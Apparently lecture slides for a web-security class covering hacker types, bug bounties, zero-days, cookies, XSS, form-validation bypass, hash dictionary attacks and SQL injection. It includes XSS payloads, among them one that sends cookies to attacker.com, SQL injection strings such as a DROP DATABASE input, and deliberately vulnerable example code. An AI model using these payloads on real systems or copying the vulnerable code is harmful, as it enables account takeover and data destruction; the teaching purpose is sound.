@@ -1,0 +1,1458 @@
+
+
+
+
+
+
+
+
+
+
+
+IMPORTANT!
+Never trust user input.
+
+
+
+
+
+
+
+
+
+
+
+
+
+Plan
+
+
+
+Hackers
+Intent / Permission
+Hats
+Penetration Testing
+Bug Bounty Programs
+Exploits
+Zero-day
+Cookies
+XSS
+Form Validation Bypass
+Dictionary Attack
+SQL injection
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Hackers
+
+
+
+
+
+
+
+
+
+
+
+
+"A hacker is a person skilled in information technology
+who achieves goals by non-standard means."
+
+Wikipedia
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Intent
+
+Permission
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Intent can be malicious:
+
+- to break into the system
+- to steal passwords
+- to steal money
+- to steal personal data
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Permission can be:
+
+- granted
+- not granted
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Depending on the intent and permission
+hackers can be:
+
+
+1) Black-Hat Hackers
+Have malicious intent and no permission.
+Goal: Exploit systems for personal gain
+They steal money, data or do sabotage.
+
+2) White-Hat Hackers (ethical)
+Have good intent and have permission
+to do penetration testing.
+Goal: Find vulnerabilities to improve security.
+
+3) Gray-Hat Hackers
+Have good intent, but they don't
+have a permission.
+Goal: Hack systems to expose flaws
+but it might be controversial.
+
+
+
+
+Example:
+
+Black-Hat → Stealing credit card data.
+
+White-Hat → Have a contract with a company to
+hack company’s system to reveal the bugs.
+
+Gray-Hat → Breaking into a website
+to alert admins about a vulnerability
+(without asking first).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Penetration Testing
+
+
+
+
+
+
+It is a simulated cyberattack performed
+by ethical hackers to identify security
+vulnerabilities in a system, network,
+or application.
+
+
+
+
+
+
+Key Points:
+
+- Authorized & Legal – Done with permission to improve security.
+- Mimics Real Attacks – Uses hacker techniques to find weaknesses.
+- Provides Fixes – Reports vulnerabilities so they can be patched.
+
+
+
+
+
+
+
+
+
+
+Bug Bounty Programs
+
+
+
+
+
+Initiatives which invite you to
+try to hack systems and get
+a reward for finding any vulnerabilities.
+
+
+
+Links:
+
+
+Google – https://www.google.com/about/appsecurity/reward-program/
+Microsoft – https://www.microsoft.com/en-us/msrc/bounty
+Apple – https://security.apple.com/bounty/
+Meta https://www.facebook.com/whitehat
+Uber – https://hackerone.com/uber
+Spotify – https://hackerone.com/spotify
+GitHub – https://bounty.github.com/
+U.S. Pentagon – https://hackerone.com/deptofdefense
+
+
+
+Please, remember:
+
+- Read Rules First.
+What is allowed and how much they pay.
+
+- Responsible Disclosure.
+Never test without permission outside bug bounty programs!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Exploits
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+An exploit is a software, code, or a technique
+that takes advantage of a vulnerability.
+
+
+
+Exploits are used to:
+
+- gain unauthorized access
+- execute arbitrary code
+- steal passwords/money/data
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Examples of exploits:
+
+- remote
+hacker logs into remote system
+
+- local
+hackers use vulnerable software
+to gain access to local system
+
+- web
+hackers attack web applications
+(SQL injections or XSS)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Once exploit is found it is
+published in the internet.
+
+https:www.exploit-db.com/
+
+https:www.cvedetails.com/
+
+CVE = Common Vulnerabilities and Exposures
+
+
+
+
+
+
+
+If you as a site owner don't fix
+your code, hackers will likely use
+known CVE to attack you.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Zero-Day Exploits
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+The most dangerous!
+
+No one have publicly reported
+these vulnerabilities yet.
+
+Hence, there is no official patch
+for these vulnerabilities.
+
+But this doesn't mean that no one
+knew or found them already.
+
+Black-Hat hackers may have found these
+vulnerabilities and are exploiting them.
+
+
+"zero-days" -> developers have 0 days
+for fixing these vulnerabilities,
+before hackers start exploiting them.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Example Zero-Day Lifecycle:
+
+1) Vulnerability Found
+2) Exploit Sold
+3) Attack
+4) Patch Released
+5) Attacks Decline
+
+
+
+
+
+
+
+
+
+
+
+
+
+Famous Zero-Day Exploits
+
+
+WannaCry (2017)
+Ransomware that encrypted 200,000+ systems globally.
+Disrupted hospitals, banks, and governments.
+
+SolarWinds (2020)
+Hackers spied on classified data for months
+targeting U.S. government agencies via compromised
+software updates.
+
+Log4Shell (2021)
+Allowed remote code execution via simple text strings
+due to vulnerability: CVE-2021-44228 in Apache Log4j.
+Millions of servers compromised
+
+
+
+
+
+
+
+
+
+
+
+
+
+How to protect your software?
+
+
+
+- Update software.
+Even if there is no zero-day patches
+available, still patches close other vulnerabilities
+and limit the attack surface.
+
+- Use EDR/XDR tools.
+EDR = Endpoint Detection & Response
+XDR = Extended Detection & Response
+
+These are special tools which monitor
+any activity detect abnormal behaviour
+and block suspicious actions.
+
+- Limit attack surface.
+For example, disable unused services.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Cookie
+
+
+
+
+
+
+
+A cookie is some value stored
+in your browser by websites
+you visit. It helps websites remember:
+
+- Login sessions (so you stay logged in).
+- Preferences (like language or theme settings).
+- Tracking (e.g., shopping cart items, ads you’ve seen).
+
+
+
+
+
+
+
+How cookies work?
+
+
+
+
+
+
+1. You visit a website (let's say linkedin.com)
+2. You log in (give your username and password).
+3. Website saves a small unique hash value (a cookie)
+in your browser. It is physically saved to your computer.
+4. You close the browser. Cookie stays in the memory
+of your machine.
+5. You open browser and go to linkedin.com.
+6. Website checks your browser storage and finds a cookie
+from previous session.
+7. The website trusts this cookie and logs you in.
+
+
+
+
+
+
+Now, vulnerability appears:
+
+If I have YOUR cookie, the website
+will "think" that I am YOU
+and will log me into YOUR account.
+
+
+
+
+
+
+
+
+
+
+
+
+How to see your cookies?
+
+
+
+
+
+
+
+go to google.com for example.
+in devTools go to Application tab
+select 'Cookies'.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+XSS
+
+Cross-Site Scripting
+
+
+
+
+
+
+
+
+
+
+
+XSS occurs when an attacker injects
+malicious scripts into a web application.
+These scripts are then executed in the
+browser of other users.
+
+When attacker is able to execute
+JS code on a victim's machine, they can:
+
+- steal session cookies
+- redirect users to malicious websites
+- deface the page
+
+
+
+
+
+
+
+
+
+
+
+
+XSS becomes possible when we don't
+sanitize user input in JS code.
+
+
+
+
+
+
+
+
+
+
+
+
+
+Example
+
+HTML:
+
+<label for="userInput">Type something</label>
+<input type="text" id="userInput" name="user_input">
+
+<button onclick="displayInput()">Display</button>
+
+<div id="output">Your content will appear here.</div>
+
+JS:
+
+function displayInput() {
+    const userInput = document.getElementById("userInput").value;
+    document.getElementById("output").innerHTML = userInput;
+}
+
+
+
+
+This code is vulnerable to XSS attack!
+
+It opens door wide open for hackers
+to inject any JS code into our page.
+
+
+
+
+
+
+
+example malicious inputs:
+
+<img src='fake' onerror='alert("You are hacked now!")'>
+<a href="javascript:alert('You are hacked again!')">Click me</a>
+
+
+
+
+
+
+The problem here:
+
+- The code blindly trusts user input
+and inserts it directly into the page.
+
+Never trust user input!
+
+
+
+
+
+
+
+
+/demo/xss.html
+
+
+
+
+
+
+
+
+
+
+
+
+IMPORTANT!
+Never trust user input.
+
+
+
+
+
+
+
+
+
+
+
+XSS and Cookies
+
+
+
+
+
+
+/demo/xss_cookie.html
+
+
+
+
+
+
+
+malicious input:
+
+<img src='x' onerror='function stealCookies(){alert(document.cookie)}; stealCookies()'>
+<img src='x' onerror='((){alert(document.cookie)})()'>
+<img src='x' onerror='(alert(document.cookie))()'>
+
+
+
+
+
+self-invoking function syntax:
+
+( function body )()
+
+
+
+
+
+
+
+
+
+
+Send the cookie to your server:
+
+
+<img src='x' onerror=
+'fetch("https://attacker.com/steal?cookie_stolen="+encodeURIComponent(document.cookie))'>
+
+
+
+
+
+
+
+
+
+
+
+
+IMPORTANT!
+Never trust user input.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+How to prevent XSS?
+
+
+- Never trust user input!
+
+- Never use innerHTML for user input.
+Use textContent instead.
+
+- Add special <meta> tag to your HTML <head>:
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
+
+It blocks:
+
+-- Inline scripts (<script>alert(1)</script>).
+-- External scripts (<script src="https://evil.com/hack.js">).
+-- Dangerous tags (<img onerror="malicious-code">).
+
+- Sanitize input with JS.
+
+
+Step 1. Create sanitization method
+
+function sanitize(input) {
+  return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
+/</g it is a regex:
+
+< = literally means '<'
+g = search globally, everywhere in the string
+
+
+Step 2. Use sanitization method for all inputs
+
+document.getElementById("output").innerHTML = sanitize(userInput);
+
+
+
+
+
+
+
+
+
+
+
+
+Form Validation Bypass
+
+
+
+
+
+
+
+
+
+You should never trust your
+JS validation on client-side
+(in the browser of your client).
+
+Because it is very easy to
+bypass this validation.
+
+
+
+
+
+
+
+/demo/form_validation.html
+
+
+
+
+
+First, don't change any settings
+and open Private (Incognito) window
+and type "bad".
+
+You will see that my JS validation works.
+
+
+
+
+
+Now, let's bypass it.
+
+
+
+
+
+
+
+1) Disabling JS in the browser
+
+
+
+
+
+
+
+
+In Brave go to Settings
+Type "Javascript"
+Select "Site and Shields Settings"
+Select "JavaScript"
+Select "Don't allow site to use Javascript"
+
+
+Next, open incognito window.
+
+Next, copy the path to /demo/form_validation.html
+and open it in incognito.
+
+If I submit the malicious code into input
+it is submitted - see Network tab and payload.
+
+
+
+
+
+
+
+
+
+2) Manipulating HTML code
+
+
+
+Don't disable JS in browser.
+Open the devtools.
+Change id of the input
+(right click + Edit as HTML)
+Submit malicious code.
+See Network tab and payload.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+IMPORTANT!
+Never trust user input!
+
+
+
+
+
+
+
+
+
+
+
+
+Solution?
+
+Always do validation on the backend!
+Never trust client side validation.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Dictionary Attack
+
+
+
+
+
+
+
+
+
+
+
+
+
+What is encrypted here?
+
+e99a18c428cb38d5f260853678922e03
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Step 1. Hackers will get the list of most
+popular passwords, like:
+
+123456
+password
+qwerty
+abc123
+11111
+letmein
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Step 2. They will generate hashes
+for this list:
+
+123456:    e10adc3949ba59abbe56e057f20f883e
+password:  5f4dcc3b5aa765d61d8327deb882cf99
+qwerty:    d8578edf8458ce06fbc5bb76a58c5ca4
+abc123:    e99a18c428cb38d5f260853678922e03
+11111:     96e79218965eb72c92a549dd5a330112
+foo:       d3b07384d113edec49eaa6238ad5ff00
+
+
+
+
+Now they have a dictionary!
+
+They can search this dictionary for any hash
+add get plain text equivalent.
+
+If hacker broke into your server
+and got this hash:
+
+d3b07384d113edec49eaa6238ad5ff00
+
+By searching the dictionary, they will
+find equivalent: "foo".
+
+That's how they will know your password!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Dictionaries are publicly available.
+
+
+
+
+You can search a dictionary:
+
+https://hashes.com/en/decrypt/hash
+Search for "d3b07384d113edec49eaa6238ad5ff00"
+
+
+
+
+There are dictionaries of popular passwords
+for brute-force attacks:
+
+https:github.com/danielmiessler/SecLists
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SQL injection
+
+
+
+
+
+
+
+
+
+
+
+
+SQL Injection is a code injection attack.
+I inject SQL code into input field
+and force application to run it.
+
+This allows:
+
+- Bypass authentication (log in without credentials).
+- Steal, modify, or delete data in DB.
+- Execute admin-level operations.
+
+
+
+
+
+
+
+
+
+Example:
+
+
+DB
+
+
+table: users
+id - email           - username - password
+1  - admin@email.com - admin    - 12345
+2  - user@email.com  - andrei   - 5a3b3-4(*
+3 ...
+4 ...
+
+
+SQL query:
+
+SELECT * FROM users WHERE username = 'admin' AND password = '12345';
+
+
+Now, when I get user input and try
+to compare it to what I have in DB,
+I will have this PHP script:
+
+PHP
+
+username = request.POST['username'];
+password = request.POST['password'];
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';"
+
+
+
+
+
+
+
+
+
+
+
+
+If user submitted something good:
+
+username: 'admin'
+password: '12345'
+
+The final query will look like:
+
+PHP:
+username = 'admin' // request.POST['username'];
+password = '12345' // request.POST['password'];
+query = "SELECT * FROM users WHERE username = 'admin' AND password = '12345';"
+
+
+
+
+
+
+
+
+
+What if user will give this username and no password?
+
+username: "admin' -- "
+password: ''
+
+
+
+
+
+
+
+
+
+
+The query will look like:
+
+PHP:
+username = "admin' -- " // request.POST['username'];
+password = '' // request.POST['password'];
+
+SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
+
+
+
+
+
+In SQL comment (--) is telling SQL engine to IGNORE anything after it.
+
+So effectively this query:
+SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
+
+is this query:
+
+SELECT * FROM users WHERE username = 'admin';
+
+After running this query, it will be successful,
+because there is a user 'admin' in DB.
+
+This will let me in, bypassing login.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Another example of SQL injection
+
+' OR 1=1; DROP DATABASE; --
+
+
+
+
+
+
+PHP:
+username = "' OR 1=1; DROP DATABASE; -- " // request.POST['username'];
+password = '' // request.POST['password'];
+
+SELECT * FROM users WHERE username = '' OR 1=1; DROP DATABASE; -- ' AND password = '';
+
+which is:
+
+SELECT * FROM users WHERE username = '' OR 1=1;
+DROP DATABASE;
+
+
+
+
+
+
+
+
+
+
+
+
+Never trust user input!
+
+
+
+
+
+
+
+
+
+
+
+
+
+Group Assignment
+
+
+
+- Split into teams of 3-4 students
+
+- Choose a vulnerability:
+
+#1 - SQL INJECTION
+#2 - CROSS-SITE SCRIPTING (XSS)
+#3 - RANSOMWARE
+#4 - URL MANIPULATIONS ATTACKS
+#5 - PHISHING/SPOOFING
+#6 - BROKEN ACCESS CONTROL
+#7 - DENIAL OF SERVICE ATTACKS
+#8 - CROSS-SITE REQUEST FORGERY (CSRF)
+#9 - SERVER-SIDE REQUEST FORGERY (SSRF)
+#10 - BRUTE FORCE ATTACKS (& Dictionary Attacks)
+#11 - CRYPTOGRAPHIC FAILURES
+#12 - VULNERABLE AND OUTDATED COMPONENTS
+
+
+
+
+How to accept?
+
+
+- Form a group of 3-5 students.
+- Decide who is your team leader.
+- Choose vulnerability from the list and tell your teacher.
+- Team leader first accepts Assignment via Github Classroom link.
+- Team leader creates group with
+the name equal to your vulnerability name
+(e.g. Vulnerability chosen "PHISHING/SPOOFING",
+name of GitHub team "phishing_spoofing" or similar)
+- Any other team member select this team when accepting
+the assignment link.
+- You will get a team repo (the same for each team member).
+- You can clone this repo individually.
+
+
+How to collaborate?
+
+- Team leader should do first:
+
+> git clone <repo>
+> git checkout -b develop
+> git push origin develop
+
+This way you all will have shared 'develop' branch.
+
+- Next, each team member:
+
+> git clone <repo>
+> git checkout -b develop
+> git pull origin develop
+
+- After that each team member locally
+adds corresponding content to the sections.
+And pushes changes to 'develop' branch:
+
+> git add .
+> git commit -m "Added XSS examples"
+> git push origin develop
+
+
+
+
+How to submit?
+
+- Once your work is done, your team leader
+creates one PR in group repo.
+- Each team member submits the link to this
+PR via Blackboard.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ Thank you
+
+
+
+
